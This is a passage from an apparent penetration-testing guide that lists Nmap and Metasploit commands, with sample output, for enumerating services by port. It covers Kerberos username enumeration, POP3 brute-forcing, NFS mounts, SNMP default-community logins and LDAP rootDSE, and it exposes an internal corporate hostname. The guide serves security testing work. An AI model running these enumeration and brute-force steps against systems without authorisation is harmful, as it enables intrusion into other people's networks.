<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[*] Scanned  2 of 18 hosts (11% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[*] Scanned  4 of 18 hosts (22% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware vCenter Server 6.0.0 build-3339083
</span><span class='line'>[*] Scanned  6 of 18 hosts (33% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned  8 of 18 hosts (44% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned  9 of 18 hosts (50% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned 11 of 18 hosts (61% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3073146
</span><span class='line'>[*] Scanned 13 of 18 hosts (72% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 6.0.0 build-3029758
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.0.0 build-623860
</span><span class='line'>[*] Scanned 15 of 18 hosts (83% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.5.0 build-1623387
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-799733
</span><span class='line'>[*] Scanned 17 of 18 hosts (94% complete)
</span><span class='line'>[+] 10.10.xx.xx:443 - Identified VMware ESXi 5.1.0 build-1065491</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
</ol>


<h3>Kerberos | Port 88</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/krb5-enum-users.html">krb5-enum-users.nse</a>: Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.

The script should work against Active Directory. It needs a valid Kerberos REALM in order to operate.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='VF-ROOT'" 10.74.251.24
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-23 12:13 IST
</span><span class='line'>Nmap scan report for ecindc312vw.internal.vodafone.com (10.74.251.24)
</span><span class='line'>Host is up (0.0015s latency).
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>88/tcp open  kerberos-sec
</span><span class='line'>| krb5-enum-users: 
</span><span class='line'>| Discovered Kerberos principals
</span><span class='line'>|_    root@VF-ROOT
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>POP3 | Port 110</h3>

<p><strong>Metasploit</strong> has two auxiliary scanner modules</p>

<ol>
<li><strong>POP3 Banner Grabber</strong>: which is the banner grabber for pop3
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/pop3/pop3_version
</span><span class='line'>services -p 110 -R -u</span></code></pre></td></tr></table></div></figure></li>

<li><strong>POP3 Login Utility</strong>: which attempts to authenticate to an POP3 service.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/pop3/pop3_login
</span><span class='line'>services -p 110 -R -u</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p><strong>Nmap</strong> has two NSEs</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-capabilities.html">pop3-capabilities.nse</a>: Retrieves POP3 email server capabilities.</li>
<li><a href="https://nmap.org/nsedoc/scripts/pop3-brute.html">pop3-brute.nse</a>: Tries to log into a POP3 account by guessing usernames and passwords.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx</span></code></pre></td></tr></table></div></figure>
While playing DE_ICE_S1_100, we figured out that bruteforcing POP3 service is faster than bruteforcing SSH services.
</li>
</ol>


<h3>RPCInfo | Port 111</h3>

<p>rpcinfo makes an RPC call to an RPC server and reports what it finds</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p IP_Address</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpcinfo -p 10.7.xx.xx
</span><span class='line'>   program vers proto   port  service
</span><span class='line'>    100000    2   tcp    111  portmapper
</span><span class='line'>    100000    2   udp    111  portmapper
</span><span class='line'>1073741824    1   tcp    669
</span><span class='line'>1073741824    2   tcp    669
</span><span class='line'>    399929    2   tcp    631</span></code></pre></td></tr></table></div></figure>


<p>We can use <strong>NFS Mount Scanner</strong> module to check for the nfs mounts using port 111</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/nfs/nfsmount
</span><span class='line'>services -p 111 -u -R</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Scanned  24 of 240 hosts (10% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /data/iso [0.0.0.0/0.0.0.0]
</span><span class='line'>[*] Scanned  48 of 240 hosts (20% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Public [*]
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Download [*]
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /DataVolume/Softshare [*]
</span><span class='line'>[*] Scanned  72 of 240 hosts (30% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /var/ftp/pub [10.0.0.0/255.255.255.0]
</span><span class='line'>[*] Scanned  96 of 240 hosts (40% complete)
</span><span class='line'>[+] 10.10.xx.xx NFS Export: /common []</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>The same can be achieved using showmount</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -a 172.30.xx.xx
</span><span class='line'>All mount points on 172.30.xx.xx:
</span><span class='line'>172.30.xx.xx:/SSSC-LOGS
</span><span class='line'>172.30.xx.xx:/sssclogs</span></code></pre></td></tr></table></div></figure>


<p>Multiple times we have seen msf nfsmount fail because of some error, so it sometimes better to just run a for loop with showmount</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in $(cat /tmp/msf-db-rhosts-20160413-2660-62cf9a); 
</span><span class='line'>do  
</span><span class='line'>  showmount -a $i &gt;&gt; nfs_111; 
</span><span class='line'>done;</span></code></pre></td></tr></table></div></figure>


<h3>Ident | Port 113</h3>

<p>If the port ident 113 is open, it might be a good idea to try pentest monkey ident-user-enum Perl Script. The same result is also achieved by nmap <a href="https://nmap.org/nsedoc/scripts/auth-owners.html">auth-owners.nse</a></p>

<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl ident-user-enum.pl 10.10.xx.xx 22 53 111 113 512 513 514 515
</span><span class='line'>ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )
</span><span class='line'>
</span><span class='line'>10.10.xx.xx:22    [U2FsdGVkX19U+FaOs8zFI+sBFw5PBF2/hxWdfeblTXM=]
</span><span class='line'>10.10.xx.xx:53    [U2FsdGVkX1+fVazmVwSBwobo05dskDNWG8mogAWzHS8=]
</span><span class='line'>10.10.xx.xx:111   [U2FsdGVkX1+GPhL0rdMggQOQmNzsxtKe+ro+YQ28nTg=]
</span><span class='line'>10.10.xx.xx:113   [U2FsdGVkX1+5f5j9c2qnHFL5XKMcLV7YjUW8LYWN1ac=]
</span><span class='line'>10.10.xx.xx:512   [U2FsdGVkX1+IWVqsWohbUhjr3PAgbkWTaImWIODMUDY=]
</span><span class='line'>10.10.xx.xx:513   [U2FsdGVkX19EEjrVAxj0lX0tTT/FoB3J9BUlfVqN3Qs=]
</span><span class='line'>10.10.xx.xx:514   [U2FsdGVkX18/o1MMaGmcU4ul7kNowuhfBgiplQZ0R5c=]
</span><span class='line'>10.10.xx.xx:515   [U2FsdGVkX1/8ef5wkL05TTMi+skSs65KRGIQB9Z8WnE=]</span></code></pre></td></tr></table></div></figure>


<p>The above are base64 encoded, when decoded results in Salted_Some_Garbage. If anyone know what it&rsquo;s appreciated.</p>

<h3>NetBios</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/broadcast-netbios-master-browser.html">broadcast-netbios-master-browser.nse</a>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script=broadcast-netbios-master-browser
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 21:31 IST
</span><span class='line'>Pre-scan script results:
</span><span class='line'>| broadcast-netbios-master-browser: 
</span><span class='line'>| ip             server      domain
</span><span class='line'>| 192.168.xx.xx  FILESRV     WORKGROUP
</span><span class='line'>|_192.168.xx.xx  XXXXCJ-NAS  VOLUME
</span><span class='line'>WARNING: No targets were specified, so 0 hosts scanned.</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>SNMP | Port 161</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li>
We can use use <strong>SNMP Community Scanner</strong> to find the machines which are having default communtites by using SNMP Community Scanner.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/snmp/snmp_login
</span><span class='line'>services -p 161 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.4.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Cisco IOS Software, C1130 Software (C1130-K9W7-M), Version 12.4(10b)JA, RELEASE SOFTWARE (fc2)
</span><span class='line'>Technical Support: http://www.cisco.com/techsupport
</span><span class='line'>Copyright (c) 1986-2007 by Cisco Systems, Inc.
</span><span class='line'>Compiled Wed 24-Oct-07 15:17 by prod_rel_team
</span><span class='line'>[*] Scanned 12 of 58 hosts (20% complete)
</span><span class='line'>[*] Scanned 18 of 58 hosts (31% complete)
</span><span class='line'>[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
</span><span class='line'>[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
</span><span class='line'>[*] Scanned 24 of 58 hosts (41% complete)
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>[*] Scanned 29 of 58 hosts (50% complete)
</span><span class='line'>[*] Scanned 35 of 58 hosts (60% complete)
</span><span class='line'>[*] Scanned 41 of 58 hosts (70% complete)
</span><span class='line'>[*] Scanned 47 of 58 hosts (81% complete)
</span><span class='line'>[+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006</span></code></pre></td></tr></table></div></figure>
</li>

<li>Next we can use <strong>SNMP Enumeration Module</strong> to enumerate the devices for which we have found the community strings 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/snmp/snmp_enum
</span><span class='line'>creds -p 161 -R</span></code></pre></td></tr></table></div></figure>

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.11.xx.xx, Connected.
</span><span class='line'>
</span><span class='line'>[*] System information:
</span><span class='line'>
</span><span class='line'>Host IP                       : 10.11.xx.xx
</span><span class='line'>Hostname                      : X150-24t
</span><span class='line'>Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
</span><span class='line'>Contact                       : support@extremenetworks.com, +1 888 257 3000
</span><span class='line'>Location                      : -
</span><span class='line'>Uptime snmp                   : -
</span><span class='line'>Uptime system                 : 206 days, 00:20:58.04
</span><span class='line'>System date                   : -
</span><span class='line'>
</span><span class='line'>[*] Network information:
</span><span class='line'>
</span><span class='line'>IP forwarding enabled         : no
</span><span class='line'>Default TTL                   : 64
</span><span class='line'>TCP segments received         : 6842
</span><span class='line'>TCP segments sent             : 6837
</span><span class='line'>TCP segments retrans          : 0
</span><span class='line'>Input datagrams               : 243052379
</span><span class='line'>Delivered datagrams           : 192775346
</span><span class='line'>Output datagrams              : 993667</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>Check Point FireWall-1 Topology | Port 264</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure</strong> This module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/gather/checkpoint_hostname
</span><span class='line'>set RHOST 10.10.xx.xx</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...
</span><span class='line'>[+] Appears to be a CheckPoint Firewall...
</span><span class='line'>[+] Firewall Host: FIREFIGHTER-SEC
</span><span class='line'>[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>LDAP | Port 389</h3>

<p>Nmap has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html">ldap-rootdse.nse</a>: Retrieves the LDAP root DSA-specific Entry (DSE)
Sample Output:

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 389 --script ldap-rootdse &lt;host&gt;
</span><span class='line'>nmap -p 389 --script ldap-rootdse 172.16.xx.xx
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 23:05 IST
</span><span class='line'>Nmap scan report for 172.16.xx.xx
</span><span class='line'>Host is up (0.015s latency).
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>389/tcp open  ldap
</span><span class='line'>| ldap-rootdse: 
</span><span class='line'>| LDAP Results
</span><span class='line'>|   &lt;ROOT&gt;
</span><span class='line'>|       currentTime: 20160503173447.0Z
</span><span class='line'>|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
</span><span class='line'>|       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
</span><span class='line'>|       defaultNamingContext: DC=xxxpcx,DC=com
</span><span class='line'>|       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
</span><span class='line'>|       rootDomainNamingContext: DC=xxxpcx,DC=com
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.319
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.801
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.473
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.528
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.417
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.619
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.841
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.529
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.805
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.521
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.970
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1338
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.474
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1339
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1340
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1413
</span><span class='line'>|       supportedControl: 2.16.xx.xx.113730.3.4.9
</span><span class='line'>|       supportedControl: 2.16.xx.xx.113730.3.4.10
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1504
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1852
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.802
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1907
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1948
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1974
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.1341
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2026
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2064
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2065
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2066
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2090
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2205
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2204
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2206
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2211
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2239
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2255
</span><span class='line'>|       supportedControl: 1.2.xx.xx.1.4.2256
</span><span class='line'>|       supportedLDAPVersion: 3
</span><span class='line'>|       supportedLDAPVersion: 2
</span><span class='line'>|       supportedLDAPPolicies: MaxPoolThreads
</span><span class='line'>|       supportedLDAPPolicies: MaxPercentDirSyncRequests
</span><span class='line'>|       supportedLDAPPolicies: MaxDatagramRecv
</span><span class='line'>|       supportedLDAPPolicies: MaxReceiveBuffer
</span><span class='line'>|       supportedLDAPPolicies: InitRecvTimeout
</span><span class='line'>|       supportedLDAPPolicies: MaxConnections
</span><span class='line'>|       supportedLDAPPolicies: MaxConnIdleTime
</span><span class='line'>|       supportedLDAPPolicies: MaxPageSize
</span><span class='line'>|       supportedLDAPPolicies: MaxBatchReturnMessages
</span><span class='line'>|       supportedLDAPPolicies: MaxQueryDuration
</span><span class='line'>|       supportedLDAPPolicies: MaxTempTableSize
</span><span class='line'>|       supportedLDAPPolicies: MaxResultSetSize
</span><span class='line'>|       supportedLDAPPolicies: MinResultSets
</span><span class='line'>|       supportedLDAPPolicies: MaxResultSetsPerConn
</span><span class='line'>|       supportedLDAPPolicies: MaxNotificationPerConn
</span><span class='line'>|       supportedLDAPPolicies: MaxValRange
</span><span class='line'>|       supportedLDAPPolicies: MaxValRangeTransitive
</span><span class='line'>|       supportedLDAPPolicies: ThreadMemoryLimit
</span><span class='line'>|       supportedLDAPPolicies: SystemMemoryLimitPercent
</span><span class='line'>|       highestCommittedUSN: 70892
</span><span class='line'>|       supportedSASLMechanisms: GSSAPI
</span><span class='line'>|       supportedSASLMechanisms: GSS-SPNEGO
</span><span class='line'>|       supportedSASLMechanisms: EXTERNAL
</span><span class='line'>|       supportedSASLMechanisms: DIGEST-MD5
</span><span class='line'>|       dnsHostName: SCN-DC01.xxxpcx.com
</span><span class='line'>|       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
</span><span class='line'>|       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
